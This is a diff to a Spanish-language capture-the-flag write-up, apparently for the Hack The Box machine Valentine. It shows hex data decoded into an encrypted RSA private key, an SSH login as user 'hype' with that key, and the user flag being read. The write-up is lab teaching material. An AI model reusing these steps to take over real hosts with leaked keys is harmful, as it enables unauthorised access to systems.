@@ -102,8 +102,8 @@ Encontramos un directory listing con dos archivos
 hype_key
 notes.txt
 ```
-Aqui encontramos un archivo en formato `HEX`
-```
+Aqui encontramos un archivo en formato `HEX` que reverseamos con el comando `xxd -ps -r` y le pasamos el archivo almacenado con nombre `hex`.
+```bash
 # xxd -ps -r hex 
 -----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
@@ -136,3 +136,25 @@ l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
 RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
 -----END RSA PRIVATE KEY----- 
 ```
+Credenciales: User - `hype` 
+Procedemos a intentar conectarnos por `SSH` con las credenciales obtenidas y la `id_rsa`
+```bash
+# ssh -i id_rsa hype@10.10.10.79             
+Enter passphrase for key 'id_rsa':  
+Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+New release '14.04.5 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
+hype@Valentine:~$ ls
+Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
+hype@Valentine:~$ cd Desktop/
+hype@Valentine:~/Desktop$ ls
+user.txt
+hype@Valentine:~/Desktop$ cat user.txt 
+e6710a5464769fd5fcd2xxxxxxxxxxxxxxx
+```
+Conseguimos conectarnos y conseguimos la flag del `user.txt`
